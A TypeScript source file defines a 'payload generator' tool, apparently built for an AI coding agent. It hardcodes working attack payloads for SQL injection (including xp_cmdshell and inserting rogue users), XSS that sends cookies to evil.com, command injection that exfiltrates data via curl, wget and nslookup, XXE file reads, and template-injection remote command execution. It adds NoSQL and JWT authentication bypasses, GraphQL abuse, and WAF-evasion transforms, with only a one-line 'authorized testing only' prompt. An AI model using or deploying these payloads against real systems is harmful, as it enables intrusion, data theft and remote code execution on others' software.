/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { BaseTool, Icon, ToolResult, ToolCallConfirmationDetails, ToolConfirmationOutcome } from './tools.js';
import { Type } from '@google/genai';
import { SchemaValidator } from '../utils/schemaValidator.js';
import { Config } from '../config/config.js';
import { getErrorMessage } from '../utils/errors.js';

/**
 * Parameters for the PayloadGeneratorTool.
 */
export interface PayloadGeneratorToolParams {
  /**
   * Type of payload to generate
   */
  payloadType: 'sqli' | 'xss' | 'command-injection' | 'xxe' | 'ssti' | 'nosql' | 'ldap' | 'xpath' | 'jwt' | 'graphql' | 'api-abuse' | 'all';
  /**
   * Target technology or framework
   */
  technology?: string;
  /**
   * Evasion techniques to apply
   */
  evasion?: 'encoding' | 'obfuscation' | 'polyglot' | 'waf-bypass' | 'time-based' | 'all';
  /**
   * Context where payload will be used
   */
  context?: 'form' | 'url' | 'header' | 'json' | 'xml' | 'cookie' | 'websocket';
  /**
   * WAF or security system to bypass
   */
  wafType?: string;
  /**
   * Custom parameters or constraints
   */
  customParams?: string;
}

/**
 * Professional payload generator for advanced vulnerability testing and exploitation.
 */
export class PayloadGeneratorTool extends BaseTool<PayloadGeneratorToolParams, ToolResult> {
  static readonly Name: string = 'payload_generator';

  constructor(private readonly config: Config) {
    super(
      PayloadGeneratorTool.Name,
      'Professional Payload Generator',
      'Generates sophisticated payloads for vulnerability testing and exploitation using professional security research techniques.',
      Icon.Terminal,
      {
        type: Type.OBJECT,
        properties: {
          payloadType: {
            type: Type.STRING,
            enum: ['sqli', 'xss', 'command-injection', 'xxe', 'ssti', 'nosql', 'ldap', 'xpath', 'jwt', 'graphql', 'api-abuse', 'all'],
            description: 'Type of payload to generate (sqli: SQL injection, xss: Cross-site scripting, etc.)',
          },
          technology: {
            type: Type.STRING,
            description: 'Target technology or framework (e.g., "MySQL", "MongoDB", "Angular", "React", "Flask", "Django")',
          },
          evasion: {
            type: Type.STRING,
            enum: ['encoding', 'obfuscation', 'polyglot', 'waf-bypass', 'time-based', 'all'],
            description: 'Evasion techniques to apply to payloads',
          },
          context: {
            type: Type.STRING,
            enum: ['form', 'url', 'header', 'json', 'xml', 'cookie', 'websocket'],
            description: 'Context where the payload will be used',
          },
          wafType: {
            type: Type.STRING,
            description: 'WAF or security system to bypass (e.g., "Cloudflare", "AWS WAF", "ModSecurity")',
          },
          customParams: {
            type: Type.STRING,
            description: 'Custom parameters, constraints, or specific requirements for payload generation',
          },
        },
        required: ['payloadType'],
      },
      true,
      true,
    );
  }

  validateToolParams(params: PayloadGeneratorToolParams): string | null {
    const errors = SchemaValidator.validate(this.schema.parameters, params);
    if (errors) {
      return errors;
    }

    return null;
  }

  getDescription(params: PayloadGeneratorToolParams): string {
    const evasionText = params.evasion ? ` with ${params.evasion} evasion` : '';
    const contextText = params.context ? ` for ${params.context} context` : '';
    return `Generating ${params.payloadType} payloads${evasionText}${contextText}`;
  }

  async shouldConfirmExecute(
    params: PayloadGeneratorToolParams,
  ): Promise<ToolCallConfirmationDetails | false> {
    return {
      type: 'info',
      title: 'Confirm Payload Generation',
      prompt: `This will generate professional-grade ${params.payloadType} payloads for security testing. These payloads are for authorized testing only.`,
      urls: [],
      onConfirm: async (outcome: ToolConfirmationOutcome) => {
        // Handle confirmation outcome if needed
      },
    };
  }

  private generateSQLInjectionPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const basePayloads = [
      // Union-based payloads
      "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT @@version,user(),database(),1,1,1,1,1,1,1--",
      
      // Boolean-based blind payloads
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
      "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      
      // Time-based blind payloads
      "'; WAITFOR DELAY '00:00:05'--",
      "' AND (SELECT SLEEP(5))--",
      "'; SELECT pg_sleep(5)--",
      
      // Error-based payloads
      "' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND UpdateXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
      
      // Second-order payloads
      "admin'/**/OR/**/1=1#",
      "admin' OR 'a'='a",
      "1' OR '1'='1' UNION SELECT * FROM users--",
      
      // Advanced payloads
      "'; INSERT INTO users (username,password) VALUES ('hacker','password123')--",
      "'; CREATE TABLE temp_table AS SELECT * FROM users--",
      "'; EXEC xp_cmdshell('whoami')--",
    ];

    const mysqlPayloads = [
      "' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--",
      "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
      "' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ];

    const postgresPayloads = [
      "'; SELECT string_agg(datname, ',') FROM pg_database--",
      "'; SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'--",
      "'; SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'--",
    ];

    const mssqlPayloads = [
      "'; SELECT name FROM sys.databases FOR XML PATH('')--",
      "'; SELECT name FROM sys.tables FOR XML PATH('')--",
      "'; SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users') FOR XML PATH('')--",
      "'; EXEC xp_dirtree 'C:\\'--",
    ];

    let payloads = [...basePayloads];

    if (technology?.toLowerCase().includes('mysql')) {
      payloads.push(...mysqlPayloads);
    } else if (technology?.toLowerCase().includes('postgres')) {
      payloads.push(...postgresPayloads);
    } else if (technology?.toLowerCase().includes('mssql') || technology?.toLowerCase().includes('sql server')) {
      payloads.push(...mssqlPayloads);
    }

    if (evasion) {
      payloads = this.applyEvasionTechniques(payloads, evasion);
    }

    return payloads;
  }

  private generateXSSPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const basePayloads = [
      // Basic XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      
      // DOM-based XSS
      "<script>alert(document.domain)</script>",
      "<script>alert(document.cookie)</script>",
      "<script>window.location='http://evil.com/?cookie='+document.cookie</script>",
      
      // Event-based XSS
      "<body onload=alert('XSS')>",
      "<div onmouseover=alert('XSS')>hover me</div>",
      "<input onfocus=alert('XSS') autofocus>",
      
      // Advanced XSS
      "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
      "<script>setTimeout('alert(\"XSS\")',1000)</script>",
      "<script>new Function('alert(\"XSS\")')();</script>",
      
      // Filter bypass
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script/src=data:,alert('XSS')></script>",
      "<svg><script>alert('XSS')</script></svg>",
      
      // Polyglot payloads
      "javascript:alert('XSS')",
      "'><script>alert('XSS')</script>",
      "\"><script>alert('XSS')</script>",
      
      // Modern framework bypasses
      "{{constructor.constructor('alert(\"XSS\")')()}}",
      "${alert('XSS')}",
      "#{alert('XSS')}",
    ];

    const reactPayloads = [
      "dangerouslySetInnerHTML={{__html: '<script>alert(\"XSS\")</script>'}}",
      "{`<script>alert('XSS')</script>`}",
      "className=\"onclick='alert(\\\"XSS\\\")'\"",
    ];

    const angularPayloads = [
      "{{constructor.constructor('alert(\"XSS\")')()}}",
      "{{$on.constructor('alert(\"XSS\")')()}}",
      "[innerHTML]=\"'<script>alert(\\\"XSS\\\")</script>'\"",
    ];

    let payloads = [...basePayloads];

    if (technology?.toLowerCase().includes('react')) {
      payloads.push(...reactPayloads);
    } else if (technology?.toLowerCase().includes('angular')) {
      payloads.push(...angularPayloads);
    }

    if (context === 'json') {
      payloads = payloads.map(p => JSON.stringify(p));
    } else if (context === 'url') {
      payloads = payloads.map(p => encodeURIComponent(p));
    }

    if (evasion) {
      payloads = this.applyEvasionTechniques(payloads, evasion);
    }

    return payloads;
  }

  private generateCommandInjectionPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const basePayloads = [
      // Basic command injection
      "; whoami",
      "| whoami",
      "& whoami",
      "&& whoami",
      "|| whoami",
      
      // Command chaining
      "; cat /etc/passwd",
      "| cat /etc/passwd",
      "; ls -la",
      "; pwd",
      
      // Time-based
      "; sleep 5",
      "| ping -c 5 127.0.0.1",
      "; timeout 5",
      
      // Data exfiltration
      "; curl http://evil.com/$(whoami)",
      "| wget http://evil.com/$(id)",
      "; nslookup $(whoami).evil.com",
      
      // Advanced techniques
      "; $(echo d2hvYW1p | base64 -d)",
      "| bash -c 'echo $USER'",
      "; python -c 'import os; os.system(\"whoami\")'",
      
      // Windows specific
      "& dir",
      "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
      "& echo %USERNAME%",
      
      // Blind injection
      "; ping -c 1 127.0.0.1 && echo success",
      "| test -f /etc/passwd && echo exists",
    ];

    let payloads = [...basePayloads];

    if (evasion) {
      payloads = this.applyEvasionTechniques(payloads, evasion);
    }

    return payloads;
  }

  private generateXXEPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const basePayloads = [
      // Basic XXE
      `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`,
      
      // Blind XXE
      `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/"> ]>
<foo>&xxe;</foo>`,
      
      // Parameter entity XXE
      `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe; ]>
<foo></foo>`,
      
      // CDATA XXE
      `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo><![CDATA[&xxe;]]></foo>`,
      
      // Windows file access
      `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"> ]>
<foo>&xxe;</foo>`,
    ];

    return basePayloads;
  }

  private generateSSTIPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const jinja2Payloads = [
      "{{config.items()}}",
      "{{''.__class__.__mro__[1].__subclasses__()}}",
      "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
      "{{lipsum.__globals__['os'].popen('id').read()}}",
      "{{cycler.__init__.__globals__.os.popen('whoami').read()}}",
    ];

    const twigPayloads = [
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('whoami')}}",
      "{{_self.env.setCache('ftp://evil.com:2121')}}",
      "{{7*7}}[[?]]{{7*'7'}}",
    ];

    const smartyPayloads = [
      "{php}echo `whoami`;{/php}",
      "{system('whoami')}",
      "{eval('system(\"whoami\");')}",
    ];

    const freemarkerPayloads = [
      "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }",
      "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
    ];

    let payloads: string[] = [];

    if (technology?.toLowerCase().includes('jinja') || technology?.toLowerCase().includes('flask')) {
      payloads.push(...jinja2Payloads);
    } else if (technology?.toLowerCase().includes('twig')) {
      payloads.push(...twigPayloads);
    } else if (technology?.toLowerCase().includes('smarty')) {
      payloads.push(...smartyPayloads);
    } else if (technology?.toLowerCase().includes('freemarker')) {
      payloads.push(...freemarkerPayloads);
    } else {
      // Include all if technology not specified
      payloads.push(...jinja2Payloads, ...twigPayloads, ...smartyPayloads, ...freemarkerPayloads);
    }

    if (evasion) {
      payloads = this.applyEvasionTechniques(payloads, evasion);
    }

    return payloads;
  }

  private generateNoSQLPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const mongoPayloads = [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "return true"}',
      '{"$where": "sleep(5000)"}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]}',
      '{"username": {"$regex": "^admin"}}',
    ];

    const couchdbPayloads = [
      '_all_docs',
      '_design/test/_view/all',
      '{"selector": {"$gt": null}}',
    ];

    let payloads: string[] = [];

    if (technology?.toLowerCase().includes('mongo')) {
      payloads.push(...mongoPayloads);
    } else if (technology?.toLowerCase().includes('couch')) {
      payloads.push(...couchdbPayloads);
    } else {
      payloads.push(...mongoPayloads, ...couchdbPayloads);
    }

    return payloads;
  }

  private generateJWTPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const jwtPayloads = [
      // Algorithm confusion
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
      
      // None algorithm
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
      
      // Weak secret
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature_here',
      
      // KID manipulation
      'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.payload.signature',
    ];

    return jwtPayloads;
  }

  private generateGraphQLPayloads(technology?: string, evasion?: string, context?: string): string[] {
    const graphqlPayloads = [
      // Introspection query
      `{
        __schema {
          types {
            name
            fields {
              name
              type {
                name
              }
            }
          }
        }
      }`,
      
      // Query depth attack
      `{
        user(id: "1") {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      name
                    }
                  }
                }
              }
            }
          }
        }
      }`,
      
      // Alias overloading
      `{
        alias1: expensiveQuery(id: "1")
        alias2: expensiveQuery(id: "2")
        alias3: expensiveQuery(id: "3")
      }`,
      
      // SQL injection in GraphQL
      `{
        user(id: "1' UNION SELECT * FROM users--") {
          name
          email
        }
      }`,
    ];

    return graphqlPayloads;
  }

  private applyEvasionTechniques(payloads: string[], evasion: string): string[] {
    const evadedPayloads: string[] = [];

    for (const payload of payloads) {
      switch (evasion) {
        case 'encoding':
          evadedPayloads.push(this.applyEncoding(payload));
          break;
        case 'obfuscation':
          evadedPayloads.push(this.applyObfuscation(payload));
          break;
        case 'polyglot':
          evadedPayloads.push(this.createPolyglot(payload));
          break;
        case 'waf-bypass':
          evadedPayloads.push(this.applyWAFBypass(payload));
          break;
        case 'time-based':
          evadedPayloads.push(this.makeTimeBased(payload));
          break;
        case 'all':
          evadedPayloads.push(
            this.applyEncoding(payload),
            this.applyObfuscation(payload),
            this.createPolyglot(payload),
            this.applyWAFBypass(payload),
            this.makeTimeBased(payload)
          );
          break;
        default:
          evadedPayloads.push(payload);
      }
    }

    return evadedPayloads;
  }

  private applyEncoding(payload: string): string {
    // URL encoding
    const urlEncoded = encodeURIComponent(payload);
    // Double URL encoding
    const doubleEncoded = encodeURIComponent(urlEncoded);
    // HTML entity encoding
    const htmlEncoded = payload.replace(/[<>&"']/g, (char) => {
      const entities: Record<string, string> = {
        '<': '&lt;',
        '>': '&gt;',
        '&': '&amp;',
        '"': '&quot;',
        "'": '&#x27;'
      };
      return entities[char] || char;
    });
    
    return `Original: ${payload}\nURL Encoded: ${urlEncoded}\nDouble Encoded: ${doubleEncoded}\nHTML Encoded: ${htmlEncoded}`;
  }

  private applyObfuscation(payload: string): string {
    // Case variation
    const caseVariation = payload.replace(/script/gi, 'ScRiPt');
    // Comment insertion
    const commentInserted = payload.replace(/script/gi, 'scr/**/ipt');
    // Unicode obfuscation
    const unicodeObfuscated = payload.replace(/a/g, '\\u0061');
    
    return `Case Variation: ${caseVariation}\nComment Inserted: ${commentInserted}\nUnicode: ${unicodeObfuscated}`;
  }

  private createPolyglot(payload: string): string {
    return `'">><script>alert('${payload}')</script><img src=x onerror=alert('${payload}')>`;
  }

  private applyWAFBypass(payload: string): string {
    // WAF bypass techniques
    const spaceToComment = payload.replace(/ /g, '/**/');
    const addRandomCase = payload.replace(/[a-z]/gi, (char) => 
      Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
    );
    
    return `Comment Spaces: ${spaceToComment}\nRandom Case: ${addRandomCase}`;
  }

  private makeTimeBased(payload: string): string {
    if (payload.includes('script')) {
      return `<script>setTimeout(function(){${payload.replace('<script>', '').replace('</script>', '')}}, 5000)</script>`;
    }
    return `${payload}; sleep(5)`;
  }

  async execute(
    params: PayloadGeneratorToolParams,
    signal: AbortSignal,
    updateOutput?: (output: string) => void,
  ): Promise<ToolResult> {
    const validationError = this.validateToolParams(params);
    if (validationError) {
      return {
        llmContent: `Error: Invalid parameters. ${validationError}`,
        returnDisplay: validationError,
      };
    }

    try {
      updateOutput?.(`🎯 Generating ${params.payloadType} payloads...\n\n`);
      
      let allPayloads: string[] = [];
      let results = '';

      const generatePayloads = (type: string) => {
        switch (type) {
          case 'sqli':
            return this.generateSQLInjectionPayloads(params.technology, params.evasion, params.context);
          case 'xss':
            return this.generateXSSPayloads(params.technology, params.evasion, params.context);
          case 'command-injection':
            return this.generateCommandInjectionPayloads(params.technology, params.evasion, params.context);
          case 'xxe':
            return this.generateXXEPayloads(params.technology, params.evasion, params.context);
          case 'ssti':
            return this.generateSSTIPayloads(params.technology, params.evasion, params.context);
          case 'nosql':
            return this.generateNoSQLPayloads(params.technology, params.evasion, params.context);
          case 'jwt':
            return this.generateJWTPayloads(params.technology, params.evasion, params.context);
          case 'graphql':
            return this.generateGraphQLPayloads(params.technology, params.evasion, params.context);
          default:
            return [];
        }
      };

      if (params.payloadType === 'all') {
        const payloadTypes = ['sqli', 'xss', 'command-injection', 'xxe', 'ssti', 'nosql', 'jwt', 'graphql'];
        for (const type of payloadTypes) {
          updateOutput?.(`Generating ${type} payloads...\n`);
          const payloads = generatePayloads(type);
          results += `\n=== ${type.toUpperCase()} PAYLOADS ===\n`;
          payloads.forEach((payload, index) => {
            results += `${index + 1}. ${payload}\n`;
          });
          allPayloads.push(...payloads);
        }
      } else {
        const payloads = generatePayloads(params.payloadType);
        results += `=== ${params.payloadType.toUpperCase()} PAYLOADS ===\n`;
        payloads.forEach((payload, index) => {
          results += `${index + 1}. ${payload}\n`;
        });
        allPayloads = payloads;
      }

      if (params.technology) {
        results += `\nOptimized for: ${params.technology}\n`;
      }
      if (params.evasion) {
        results += `Evasion techniques applied: ${params.evasion}\n`;
      }
      if (params.context) {
        results += `Context: ${params.context}\n`;
      }
      if (params.wafType) {
        results += `WAF bypass for: ${params.wafType}\n`;
      }

      results += `\nTotal payloads generated: ${allPayloads.length}\n`;

      updateOutput?.('\n✅ Payload generation completed!\n');

      return {
        llmContent: `Generated ${allPayloads.length} professional ${params.payloadType} payloads:\n\n${results}`,
        returnDisplay: results || 'Payload generation completed. Check output for detailed results.',
      };
    } catch (error) {
      return {
        llmContent: `Failed to generate payloads: ${getErrorMessage(error)}`,
        returnDisplay: `Error: ${getErrorMessage(error)}`,
      };
    }
  }
}
